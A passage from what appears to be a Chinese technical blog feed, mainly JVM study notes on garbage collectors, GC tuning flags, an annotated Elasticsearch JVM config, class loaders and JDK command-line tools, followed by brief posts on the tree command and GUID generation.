GC。为了解决这个问题，CMS收集器默认提供了一个<code>-XX:+UseCMSCompactAtFullCollection</code>收集开关参数（默认就是开启的)，用于在CMS收集器进行FullGC完开启内存碎片的合并整理过程，内存整理的过程是无法并发的，这样内存碎片问题倒是没有了，不过停顿时间不得不变长。虚拟机设计者还提供了另外一个参数<code>-XX:CMSFullGCsBeforeCompaction</code>参数用于设置执行多少次不压缩的FULL GC后跟着来一次带压缩的（默认值为0，表示每次进入Full GC时都进行碎片整理）。</p><p>  不幸的是，它作为老年代的收集器，却无法与jdk1.4中已经存在的新生代收集器Parallel Scavenge配合工作，所以在jdk1.5中使用CMS来收集老年代的时候，新生代只能选择ParNew或Serial收集器中的一个。</p><p>  <code>-XX:CMSInitiatingOccupancyFraction</code>配置可以设置老年代使用了多少空间后才进行GC。默认是68%，这是一个偏保守的设置，我们可以适当的调高这个参数。除了前面的配置外，我们还需要配置<code>-XX:+UseCMSInitiatingOccupancyOnly</code>这要求JVM不基于运行时的数据来进行GC，每次JVM都通过CMSInitiatingOccupancyFraction的值进行CMS收集。</p></li><li><p>G1收集器</p><p>  G1收集器是一款面向服务端应用的垃圾收集器。HotSpot团队赋予它的使命是在未来替换掉JDK1.5中发布的CMS收集器。与其他GC收集器相比，G1具备如下特点：</p><ul><li><p>并行与并发</p><p>  G1能更充分的利用CPU，多核环境下的硬件优势来缩短stop the world的停顿时间。</p></li><li><p>分代收集</p><p>  和其他收集器一样，分代的概念在G1中依然存在，不过G1不需要其他的垃圾回收器的配合就可以独自管理整个GC堆。</p></li><li><p>空间整合</p><p>  G1收集器有利于程序长时间运行，分配大对象时不会无法得到连续的空间而提前触发一次GC。</p></li><li><p>可预测的非停顿</p><p>  这是G1相对于CMS的另一大优势，降低停顿时间是G1和CMS共同的关注点，能让使用者明确指定在一个长度为M毫秒的时间片段内，消耗在垃圾收集上的时间不得超过N毫秒。</p></li></ul><p>  在使用G1收集器时，Java堆的内存布局和其他收集器有很大的差别，它将这个Java堆分为多个大小相等的独立区域，虽然还保留新生代和老年代的概念，但是新生代和老年代不再是物理隔离的了，它们都是一部分Region（不需要连续）的集合。<br>  虽然G1看起来有很多优点，实际上CMS还是主流。</p></li></ul><h4 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h4><p>分析程序中指针的动态作用域，看某个指针是否指向某个固定的对象并且没有“逃逸”出某个函数&#x2F;方法或者线程的范围。如果没有逃逸则可知该指针只在某个局部范围内可见，外部（别的函数&#x2F;方法或线程）无法看到它。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> StringBuffer <span class="title function_">craeteStringBuffer</span><span class="params">(String s1, String s2)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">    sb.append(s1);</span><br><span class="line">    sb.append(s2);</span><br><span class="line">    <span class="keyword">return</span> sb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时方法内部的局部变量有可能被其他方法所改变，这样它的作用域就不只是在方法内部。虽然它是一个局部变量，称其逃逸到了方法外部。</p><h4 id="GC-roots"><a href="#GC-roots" class="headerlink" title="GC roots"></a>GC roots</h4><ul><li>所有Java线程当前活跃的栈帧里指向GC堆里的对象的引用；换句话说，当前所有正在被调用的方法的引用类型的参数&#x2F;局部变量&#x2F;临时值。</li><li>VM的一些静态数据结构里指向GC堆里的对象的引用，例如说HotSpot VM里的Universe里有很多这样的引用。</li><li>JNI handles，包括global handles和local handles</li><li>（看情况）所有当前被加载的Java类</li><li>（看情况）Java类的引用类型静态变量</li><li>（看情况）Java类的运行时常量池里的引用类型常量（String或Class类型）</li><li>（看情况）String常量池（StringTable）里的引用</li></ul><blockquote><p>作者：RednaxelaFX<br>链接：<a href="https://www.zhihu.com/question/53613423/answer/135743258">https://www.zhihu.com/question/53613423/answer/135743258</a></p></blockquote><h4 id="与GC相关的常用参数"><a href="#与GC相关的常用参数" class="headerlink" title="与GC相关的常用参数"></a>与GC相关的常用参数</h4><blockquote><p>以 -X 开头的选项是非标准选项。不过，有些选项也开始变成标准了（尤其是 -Xms 和 -Xmx）。与此同时，不同的 Java 版本不断引入 -XX: 选项。这些选项是实验性质的，不要在生产中使用。</p></blockquote><ul><li><p>Xmx</p><p>  设置堆内存的最大值。</p></li><li><p>Xms</p><p>  设置堆内存的初始值。</p></li><li><p>Xmn</p><p>  设置新生代的大小。</p></li><li><p>Xss</p><p>  设置栈的大小。</p></li><li><p>-XX:PermSize&#x3D;10M</p><p>  表示JVM初始分配的永久代的容量，必须以M为单位。从Java8开始使用<code>-XX:MetaspaceSize</code>参数。</p></li><li><p>-XX:MaxPermSize&#x3D;10M</p><p>  表示JVM允许分配的永久代的最大容量，必须以M为单位，大部分情况下这个参数默认为64M。从Java8开始使用<code>-XX:MaxMetaspaceSize</code>参数。</p></li><li><p>-XX:+PrintTLAB</p><p>  表示可以看到TLAB的使用情况。</p></li><li><p>-XX:PretenureSizeThreshold&#x3D;3M</p><p>  直接晋升到老年代的对象大小，设置这个参数后，大于这个参数（3M）的对象将直接在老年代分配。</p></li><li><p>-XX:MaxTenuringThrehold&#x3D;1</p><p>  晋升到老年代的对象年龄。每个对象在坚持过一次Minor GC之后，年龄就会加1，当超过这个参数值时就进入老年代。</p></li><li><p>-XX:CompileThreshold&#x3D;1000</p><p>  表示一个方法被调用1000次之后，会被认为是热点代码，并触发即时编译(JIT)。</p></li><li><p>-XX:UseAdaptiveSizePolicy</p><p>  在这种模式下，新生代的大小、eden 和 survivor 的比例、晋升老年代的对象年龄等参数会被自动调整，以达到在堆大小、吞吐量和停顿时间之间的平衡点。在手工调优比较困难的场合，可以直接使用这种自适应的方式，仅指定虚拟机的最大堆、目标的吞吐量 (GCTimeRatio) 和停顿时间 (MaxGCPauseMills)，让虚拟机自己完成调优工作。</p></li><li><p>-XX:NewRatio&#x3D;4</p><p>  表示设置年轻代:老年代的大小比值为1:4，这意味着年轻代占整个堆的1&#x2F;5。</p></li><li><p>-XX:SurvivorRatio&#x3D;8</p><p>  新生代<code>Eden</code>区域与<code>Survivor</code>区域的容量比值，默认为8，代表Eden: Suvivor&#x3D; 8: 1。</p></li><li><p>–XX:TargetSurvivorRatio&#x3D;90</p><p>  设置 Survivor 区的可使用率。这里设置为 90%，则允许 90%的 Survivor 空间被使用。默认值是 50%。故该设置提高了 Survivor 区的使用率。当存放的对象超过这个百分比，则对象会向年老代压缩。因此，这个选项更有助于将对象留在年轻代。</p></li><li><p>-XX:ParallelGCThreads</p><p>  设置用于垃圾回收的线程数。通常情况下可以和 CPU 数量相等。但在 CPU 数量比较多的情况下，设置相对较小的数值也是合理的。</p></li><li><p>XX:MaxGCPauseMills</p><p>  设置最大垃圾收集停顿时间。它的值是一个大于 0 的整数。收集器在工作时，会调整 Java 堆大小或者其他一些参数，尽可能地把停顿时间控制在 MaxGCPauseMills 以内。</p></li><li><p>-XX:GCTimeRatio</p><p>  设置吞吐量大小，它的值是一个 0-100 之间的整数。假设 GCTimeRatio 的值为 n，那么系统将花费不超过 1&#x2F;(1+n) 的时间用于垃圾收集。</p></li><li><p>-XX:ReservedCodeCacheSize</p><p>  代码缓存区。如果代码缓存被占满，JIT编译器被停用，字节码将不再会被编译成机器码。<code>-XX:InitialCodeCacheSize</code>用来设置初始大小。</p></li><li><p>-Xnoclassgc</p><p>  表示关闭JVM对类的垃圾回收。</p></li><li><p>-XX:+TraceClassLoading</p><p>  表示查看类的加载信息。</p></li><li><p>-XX:+TraceClassUnLoading</p><p>  表示查看类的卸载信息。</p></li><li><p>-XX:+PrintHeapAtGC</p><p>  表示可以看到每次GC前后堆内存布局。</p></li><li><p>-XX:+HeapDumpOnOutOfMemoryError</p><p>  表示可以让虚拟机在出现内存溢出异常时Dump出当前的堆内存转储快照。</p></li><li><p>-XX:+PrintGC</p><p>  表示在控制台上打印出GC信息，等同于<code>-verbose:gc</code>。</p></li><li><p>-XX:+PrintGCDetails</p><p>  打印GC日志。</p></li></ul><p>下面是ElasticSearch的一份初始化配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">## JVM configuration</span><br><span class="line"></span><br><span class="line">################################################################</span><br><span class="line">## IMPORTANT: JVM heap size</span><br><span class="line">################################################################</span><br><span class="line">## ElasticSearch 要求堆最小内存等于堆最大内存，初始化时就一次性初始化好整个堆，避免频繁重新扩展堆内存。</span><br><span class="line">## You should always set the min and max JVM heap</span><br><span class="line">## size to the same value. For example, to set</span><br><span class="line">## the heap to 4 GB, set:</span><br><span class="line">##</span><br><span class="line">## -Xms4g</span><br><span class="line">## -Xmx4g</span><br><span class="line">##</span><br><span class="line">## See https://www.elastic.co/guide/en/elasticsearch/reference/current/heap-size.html</span><br><span class="line">## for more information</span><br><span class="line">##</span><br><span class="line">################################################################</span><br><span class="line"></span><br><span class="line"># Xms represents the initial size of total heap space</span><br><span class="line"># Xmx represents the maximum size of total heap space</span><br><span class="line"></span><br><span class="line">-Xms2G</span><br><span class="line">-Xmx2G</span><br><span class="line"></span><br><span class="line">################################################################</span><br><span class="line">## Expert settings</span><br><span class="line">################################################################</span><br><span class="line">##</span><br><span class="line">## All settings below this section are considered</span><br><span class="line">## expert settings. Don&#x27;t tamper with them unless</span><br><span class="line">## you understand what you are doing</span><br><span class="line">##</span><br><span class="line">################################################################</span><br><span class="line"></span><br><span class="line">## GC configuration</span><br><span class="line"># 使用CMS收集器（新生代默认的收集器为ParNew）</span><br><span class="line">-XX:+UseConcMarkSweepGC</span><br><span class="line"># 老年代容量到大75开始进行垃圾回收</span><br><span class="line">-XX:CMSInitiatingOccupancyFraction=75</span><br><span class="line"># 不基于运行时收集的数据来启动CMS垃圾收集周期，强制每次都使用CMSInitiatingOccupancyFraction的配置。</span><br><span class="line">-XX:+UseCMSInitiatingOccupancyOnly</span><br><span class="line"># 垃圾回收线程数（本机只有一个核心）</span><br><span class="line">-XX:ParallelGCThreads=1</span><br><span class="line"></span><br><span class="line">## optimizations</span><br><span class="line"></span><br><span class="line"># disable calls to System#gc</span><br><span class="line"># 屏蔽掉System.gc()</span><br><span class="line">-XX:+DisableExplicitGC</span><br><span class="line"></span><br><span class="line"># pre-touch memory pages used by the JVM during initialization</span><br><span class="line">-XX:+AlwaysPreTouch</span><br><span class="line"></span><br><span class="line">## basic</span><br><span class="line"></span><br><span class="line"># force the server VM</span><br><span class="line"># 以Server模式启动</span><br><span class="line">-server</span><br><span class="line"></span><br><span class="line"># set to headless, just in case</span><br><span class="line">-Djava.awt.headless=true</span><br><span class="line"></span><br><span class="line"># ensure UTF-8 encoding by default (e.g. filenames)</span><br><span class="line">-Dfile.encoding=UTF-8</span><br><span class="line"></span><br><span class="line"># use our provided JNA always versus the system one</span><br><span class="line">-Djna.nosys=true</span><br><span class="line"></span><br><span class="line"># flag to explicitly tell Netty to not use unsafe</span><br><span class="line">-Dio.netty.noUnsafe=true</span><br><span class="line"></span><br><span class="line">## heap dumps</span><br><span class="line"></span><br><span class="line"># generate a heap dump when an allocation from the Java heap fails</span><br><span class="line"># heap dumps are created in the working directory of the JVM</span><br><span class="line"># 虚拟机在出现内存溢出异常时Dump出当前的内存堆转储快照</span><br><span class="line">-XX:+HeapDumpOnOutOfMemoryError</span><br><span class="line"></span><br><span class="line"># specify an alternative path for heap dumps</span><br><span class="line"># ensure the directory exists and has sufficient space</span><br><span class="line">#-XX:HeapDumpPath=$&#123;heap.dump.path&#125;</span><br><span class="line"></span><br><span class="line">## GC logging</span><br><span class="line"># GC 日志</span><br><span class="line"></span><br><span class="line"># 输出GC的详细日志</span><br><span class="line">#-XX:+PrintGCDetails</span><br><span class="line"># 输出GC的时间戳（以基准时间的形式）</span><br><span class="line">#-XX:+PrintGCTimeStamps</span><br><span class="line"># 输出GC的时间戳（以日期的形式，如 2013-05-04T21:53:59.234+0800）</span><br><span class="line">#-XX:+PrintGCDateStamps</span><br><span class="line">#-XX:+PrintClassHistogram</span><br><span class="line">#-XX:+PrintTenuringDistribution</span><br><span class="line">#-XX:+PrintGCApplicationStoppedTime</span><br><span class="line"></span><br><span class="line"># log GC status to a file with time stamps</span><br><span class="line"># ensure the directory exists</span><br><span class="line">#-Xloggc:$&#123;loggc&#125;</span><br><span class="line"></span><br><span class="line"># Elasticsearch 5.0.0 will throw an exception on unquoted field names in JSON.</span><br><span class="line"># If documents were already indexed with unquoted fields in a previous version</span><br><span class="line"># of Elasticsearch, some operations may throw errors.</span><br><span class="line">#</span><br><span class="line"># WARNING: This option will be removed in Elasticsearch 6.0.0 and is provided</span><br><span class="line"># only for migration purposes.</span><br><span class="line">#-Delasticsearch.json.allow_unquoted_field_names=true</span><br></pre></td></tr></table></figure><h3 id="类加载阶段"><a href="#类加载阶段" class="headerlink" title="类加载阶段"></a>类加载阶段</h3><ol><li><p>加载和验证</p><p> 从磁盘或者网络中读取class文件，检查class文件是否符合规范。</p></li><li><p>准备和解析</p><p> 分配内存（静态变量初始化），找出类的依赖关系。</p></li><li><p>初始化</p><p> 初始化静态变量，还会运行静态初始化代码块。</p></li></ol><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>类加载采用<code>双亲委派模型</code>，<code>双亲委派模型</code>要求除了顶层的启动类加载器外，其余的类加载器都应当有自己的父类（不是继承关系，使用组合实现）加载器。<code>双亲委派模型</code>要求类加载器收到了类加载的请求要先委派给父类加载器去完成，只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去加载。</p><p>这保证了虚拟机的安全性，正是有这种机制我们才不能自定义一个类加载器去加载我们自己写的<code>java.lang.Object</code>类。</p><ol><li><p>Bootstrap ClassLoader</p><p> 负责加载<code>＜JAVA_HOME＞\lib</code>中的类。</p></li><li><p>Extension ClassLoader</p><p> 负责加载<code>＜JAVA_HOME＞\lib\ext</code>目录中的类。</p></li><li><p>Application ClassLoader</p><p> 负责加载用户类路径（ClassPath）上所指定的类库，开发者可以直接使用这个类加载器。如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。</p><blockquote><p>ClassPath用来告诉解释器从哪里寻找类，可以使用<code>-classpath</code>选项，或者设定<code>CLASSPATH</code>环境变量。一般我们会配置全局<code>CLASSPATH</code>，多个文件夹用分隔符分隔。注意：一般都以<code>.</code>开头，这代表当前文件夹。没有这个配置，我们直接在文件夹中运行<code>java [ClassName]</code>是找不到类的，因为它不会再当前文件夹查找。</p></blockquote></li></ol><p>自定义类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义类加载器一般继承于 &#123;<span class="doctag">@link</span> java.lang.ClassLoader&#125;。&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * 用户需要实现&#123;<span class="doctag">@link</span> #findClass(String)&#125;方法加载class文件，</span></span><br><span class="line"><span class="comment"> * 然后调用&#123;<span class="doctag">@link</span> #defineClass(String, byte[], int, int)&#125;将类文件（表示为字节数据）转换成类对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String classpath;</span><br><span class="line">    <span class="keyword">private</span> String privateKey;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classpath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> secret RSA私钥</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SecureClassLoader</span><span class="params">(String classpath, String secret)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classpath = classpath;</span><br><span class="line">        <span class="built_in">this</span>.privateKey = secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> loadSecureClass(name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Class&lt;?&gt; loadSecureClass(String name) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] className = name.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        className[className.length - <span class="number">1</span>] += <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] classData = Files.readAllBytes(Paths.get(classpath, className));</span><br><span class="line">        <span class="comment">// 解密数据</span></span><br><span class="line">        <span class="comment">// classData = RSA.decrypt(classData, privateKey);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">SecureClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureClassLoader</span>(args[<span class="number">0</span>], args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; personClass = classLoader.loadClass(<span class="string">&quot;cc.kekek.java.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造实例</span></span><br><span class="line">        Constructor&lt;?&gt; personConstructor = personClass.getConstructor(String.class, Byte.TYPE);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ming</span> <span class="operator">=</span> personConstructor.newInstance(<span class="string">&quot;小明&quot;</span>, (<span class="type">byte</span>) <span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;ming = &quot;</span> + ming);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;one year later...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射方式</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setAge</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;setAge&quot;</span>, Byte.TYPE);</span><br><span class="line">        setAge.invoke(ming, (<span class="type">byte</span>) <span class="number">11</span>);</span><br><span class="line">        <span class="comment">// 方法句柄方式</span></span><br><span class="line">        <span class="type">MethodType</span> <span class="variable">methodType</span> <span class="operator">=</span> MethodType.methodType(Void.TYPE, String.class);</span><br><span class="line">        <span class="type">MethodHandle</span> <span class="variable">handle</span> <span class="operator">=</span> MethodHandles.lookup().findVirtual(personClass, <span class="string">&quot;setName&quot;</span>, methodType);</span><br><span class="line">        handle.invoke(ming, <span class="string">&quot;ming&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;ming = &quot;</span> + ming);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h3><ul><li><p>javac</p><p>  java 编译命令，将java源文件编译成字节码（.class）文件。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac cc/kekek/demo/Hello.java</span><br></pre></td></tr></table></figure><ul><li><p>-classpath</p><p>  提供编译时需要（依赖）的类。</p></li><li><p>-d some&#x2F;dir</p><p>  告诉 javac 把编译得到的类文件放在哪儿。</p></li><li><p>-source <version></p><p> 设定 javac 能接受的 Java 版本。</p></li><li><p>-target <version></p><p> 设定 javac 编译得到的类文件版本。</p></li></ul></li><li><p>java </p><p>  java 是启动 Java 虚拟机的可执行文件。程序的首个入口点是指定类中的 main() 方法。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java &lt;options&gt; cc.kekek.demo.Hello &lt;args&gt;</span><br><span class="line">java -jar my-packaged.jar</span><br><span class="line">java -cp my-packaged.jar cc.kekek.demo.Hello &lt;args&gt;</span><br></pre></td></tr></table></figure><ul><li><p>-cp <classpath></p><p>  定义从哪个路径读取类。默认配置的<code>CLASSPATH</code>环境变量，这个环境变量的一般以<code>.</code>开头，代表当前目录。</p></li><li><p>-D&lt;property&#x3D;value&gt;</p><p>  设定 Java 系统属性，在 Java 程序中能取回<code>System.getProperty(&quot;property&quot;)</code>设定的属性。使用这种方式可以设定任意个属性。</p></li></ul></li><li><p>jar </p><p>  实用工具 jar 用于处理 Java 档案（.jar）文件。这是 ZIP 格式的文件，包含 Java 类、附加的资源和元数据（通常会有）。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvf my.jar someDir/</span><br></pre></td></tr></table></figure><ul><li><p>e</p><p>  把 JAR 文件变成可执行文件，而且使用指定的类作为入口点。</p></li></ul></li><li><p>jps</p><p>  显示所有的jvm进程。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看远程机器</span><br><span class="line">jsp &lt;ip&gt;</span><br></pre></td></tr></table></figure></li><li><p>jstat</p><p>  查看的通常是本地进程，不过，如果远程设备中运行着合适的 jstatd 进程，也能查看这台远程设备中的进程。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 每10s打印一下垃圾回收信息</span><br><span class="line">jstat -gcutil &lt;vmid&gt; 10ms</span><br></pre></td></tr></table></figure></li><li><p>jstatd</p><p>  jstatd 能让本地 JVM 的信息通过网络传出去。想传递信息，需要特殊的安全设置，这和 JVM 的默认设置有所不同。启动 jstatd 之前要先创建下述文件，并将其命名为 jstatd.policy。</p><blockquote><p><code>Could not contact registry</code>错误。一般所在环境DNS有问题，会有一个默认的指向。一般用户需要查看<code>hostname</code>，然后配置<code>/etc/hosts</code>配置IP。</p></blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant codebase &quot;file:$&#123;java.home&#125;/../lib/tools.jar&quot; &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jstatd -J-Djava.security.policy=&lt;path to jstat.policy&gt; </span><br></pre></td></tr></table></figure><ul><li>-p <port></li></ul></li><li><p>jstack <process id></p><p>  jstack 实用工具用于输出进程中每个 Java 线程的堆栈跟踪。</p></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li>深入理解Java虚拟机</li><li>Java技术手册</li><li>垃圾回收的算法与实现</li><li><a href="https://blog.csdn.net/yangzl2008/article/details/43202969">Java中的逃逸分析和TLAB以及Java对象分配</a></li><li><a href="https://www.ziwenxie.site/2017/07/24/java-jvm-gc/">JVM垃圾回收算法及回收器详解</a></li><li><a href="http://www.infoq.com/cn/news/2017/03/garbage-collection-algorithm">理解垃圾回收算法</a></li><li><a href="https://www.jianshu.com/p/cd85098cca39">JVM源码分析之线程局部缓存TLAB</a></li><li><a href="http://ifeve.com/useful-jvm-flags-part-7-cms-collector/">JVM实用参数（七）CMS收集器</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tree</title>
      <link href="/post/tree.html"/>
      <url>/post/tree.html</url>
      
        <content type="html"><![CDATA[<h3 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree -I &#x27;node_modules|docs|logs&#x27; -L 2</span><br></pre></td></tr></table></figure><p>参数说明：    </p><ul><li>-I 忽略文件夹</li><li>-P 匹配文件夹</li><li>-L 深度</li><li>-h 文件大小</li><li>-s 文件字节大小</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GUID</title>
      <link href="/post/GUID.html"/>
      <url>/post/GUID.html</url>
      
        <content type="html"><![CDATA[<h3 id="全局唯一ID"><a href="#全局唯一ID" class="headerlink" title="全局唯一ID"></a>全局唯一ID</h3><ol><li>uuid</li><li>objectid</li><li>redis + incr</li><li>twitter snowflake</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.jianshu.com/p/61817cf48cc3">【1】</a>  <a href="http://cenalulu.github.io/mysql/guid-generate/">【2】</a> <a href="http://calvin1978.blogcn.com/articles/uuid.html">【3】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> guid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux系统目录</title>
      <link href="/post/linux-system-directory.html"/>
      <url>/post/linux-system-directory.html</url>
      
